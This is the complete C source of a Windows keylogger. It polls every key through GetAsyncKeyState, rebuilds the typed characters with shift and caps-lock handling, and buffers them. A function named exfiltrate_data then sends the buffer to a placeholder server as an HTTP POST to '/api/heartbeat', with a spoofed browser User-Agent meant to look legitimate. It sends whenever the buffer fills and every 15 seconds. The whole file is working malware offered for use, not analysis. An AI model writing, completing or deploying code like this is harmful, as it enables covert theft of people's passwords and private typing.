#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVER "your.server.ip" // Use IP or plain domain (no https)
#define PORT 80
#define LOG_BUFFER_SIZE 1024

// Helper to get character with capitalization
char get_logged_char(int vkCode, int is_shift, int is_capslock) {
    // Letters
    if (vkCode >= 'A' && vkCode <= 'Z') {
        int caps = is_capslock ? 1 : 0;
        if (is_shift ^ caps)
            return (char)vkCode; // uppercase
        else
            return (char)(vkCode + 32); // lowercase
    }
    // Numbers and shifted symbols on number row
    if (vkCode >= '0' && vkCode <= '9') {
        if (is_shift) {
            // Shifted number keys
            char shifted[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
            return shifted[vkCode - '0'];
        } else {
            return (char)vkCode;
        }
    }
    // Space, return
    if (vkCode == VK_SPACE) return ' ';
    if (vkCode == VK_RETURN) return '\n';

    // Common punctuation
    if (vkCode == VK_OEM_1) return is_shift ? ':' : ';';
    if (vkCode == VK_OEM_2) return is_shift ? '?' : '/';
    if (vkCode == VK_OEM_3) return is_shift ? '~' : '`';
    if (vkCode == VK_OEM_4) return is_shift ? '{' : '[';
    if (vkCode == VK_OEM_5) return is_shift ? '|' : '\\';
    if (vkCode == VK_OEM_6) return is_shift ? '}' : ']';
    if (vkCode == VK_OEM_7) return is_shift ? '"' : '\'';
    if (vkCode == VK_OEM_COMMA) return is_shift ? '<' : ',';
    if (vkCode == VK_OEM_PERIOD) return is_shift ? '>' : '.';
    if (vkCode == VK_OEM_MINUS) return is_shift ? '_' : '-';
    if (vkCode == VK_OEM_PLUS) return is_shift ? '+' : '=';

    return 0;
}

void exfiltrate_data(const char *data) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char message[4096], response[4096];

    // Prepare JSON payload
    char json_payload[LOG_BUFFER_SIZE + 64];
    snprintf(json_payload, sizeof(json_payload),
        "{\"status\":\"ok\",\"data\":\"%s\"}", data);

    // Compose HTTP POST with legitimate-looking headers and endpoint
    snprintf(message, sizeof(message),
        "POST /api/heartbeat HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.0.0 Safari/537.36\r\n"
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: %d\r\n\r\n"
        "%s",
        SERVER, (int)strlen(json_payload), json_payload);

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0) {
        send(s, message, (int)strlen(message), 0);
        recv(s, response, sizeof(response), 0);
    }
    closesocket(s);
    WSACleanup();
}

int main(void) {
    char log_buffer[LOG_BUFFER_SIZE] = {0};
    int log_index = 0;
    int vkCode;
    DWORD last_exfil = GetTickCount();

    while (1) {
        int is_shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
                       (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                       (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
        int is_capslock = (GetKeyState(VK_CAPITAL) & 0x0001);

        for (vkCode = 8; vkCode <= 222; vkCode++) {
            if (GetAsyncKeyState(vkCode) == -32767) {
                char ch = get_logged_char(vkCode, is_shift, is_capslock);
                if (ch) {
                    log_buffer[log_index++] = ch;
                    if (log_index >= LOG_BUFFER_SIZE - 2) {
                        log_buffer[log_index] = '\0';
                        exfiltrate_data(log_buffer);
                        log_index = 0;
                        memset(log_buffer, 0, LOG_BUFFER_SIZE);
                        last_exfil = GetTickCount();
                    }
                }
            }
        }
        // Exfiltrate every 15 seconds even if buffer isn't full
        if (log_index > 0 && (GetTickCount() - last_exfil > 15000)) {
            log_buffer[log_index] = '\0';
            exfiltrate_data(log_buffer);
            log_index = 0;
            memset(log_buffer, 0, LOG_BUFFER_SIZE);
            last_exfil = GetTickCount();
        }
        Sleep(10);
    }
    return 0;
}
